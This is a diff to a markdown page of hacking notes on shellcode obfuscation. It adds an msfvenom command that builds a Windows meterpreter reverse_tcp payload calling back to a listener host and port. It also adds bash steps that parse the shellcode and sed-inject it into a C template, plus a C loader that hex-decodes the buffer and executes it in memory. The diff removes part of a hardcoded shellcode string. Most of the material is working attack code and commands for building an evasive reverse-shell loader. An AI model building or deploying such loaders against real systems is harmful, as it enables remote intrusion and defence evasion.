@@ -37,6 +37,10 @@ https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/p
 
 ## bash
 
+- build shellcode in **C** format
+
+      msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.69 LPORT=666 -f C -o shellcode.txt
+
 - encoding shellcode in **C** to **ANCII**
 
       \x8b\x5a\x00\x27\x0d\x0a  <-- C shellcode
@@ -46,9 +50,14 @@ https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/p
 
 - parsing shellcode data
 
-      cat shellcode.txt | tr -d '\\' | tr -d 'x'
+      # store parsed data into '$store' local var
+      store=`cat shellcode.txt | tr -d '\\' | tr -d 'x'`
 
-- template C
+      # inject shellcode into template.c using SED bash command
+      sed -i "s/INSERT_SHELLCODE_HERE/$store/g" template.c
+
+
+- template.c
 
       #include
       #include
@@ -68,38 +77,36 @@ https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/p
       void exec_shellcode(unsigned char *shellcode)
       {
       int (*funct)();
-      funct = (int (*)()) shellcode;
-      (int)(*funct)();
+         funct = (int (*)()) shellcode;
+         (int)(*funct)();
       }
 
       // return pointer to shellcode
       unsigned char* decode_shellcode(unsigned char *buffer, unsigned char *shellcode, int size)
       {
       int j=0;
-      shellcode=malloc((size/2));
-      int i=0;
+         shellcode=malloc((size/2));
+         int i=0;
       do
       {
       unsigned char temp[3]={0};
-      sprintf((char*)temp,”%c%c”,buffer[i],buffer[i+1]);
-      shellcode[j] = strtoul(temp, NULL, 16);
-      i+=2;
-      j++;
+         sprintf((char*)temp,”%c%c”,buffer[i],buffer[i+1]);
+         shellcode[j] = strtoul(temp, NULL, 16);
+         i+=2;
+         j++;
       } while(i<size);
-      return shellcode;
+         return shellcode;
       }
-      int main (int argc, char **argv)
+         int main (int argc, char **argv)
       {
-      unsigned char *shellcode;
+         unsigned char *shellcode;
+
       unsigned char buffer[]=
-      “fce8890000006089e531d2648b5230”
-      “8b520c8b52148b72280fb74a2631ff”
-      ... SNIP ...
-      “b5a25668a695bd9dffd53c067c0a80”
-      “fbe07505bb4713726f6a0053ffd5”;
+      "INSERT_SHELLCODE_HERE";
+
       int size = sizeof(buffer);
-      shellcode = decode_shellcode(buffer,shellcode,size);
-      exec_shellcode(shellcode);
+         shellcode = decode_shellcode(buffer,shellcode,size);
+         exec_shellcode(shellcode);
       }
 
 - compiling with **GCC**
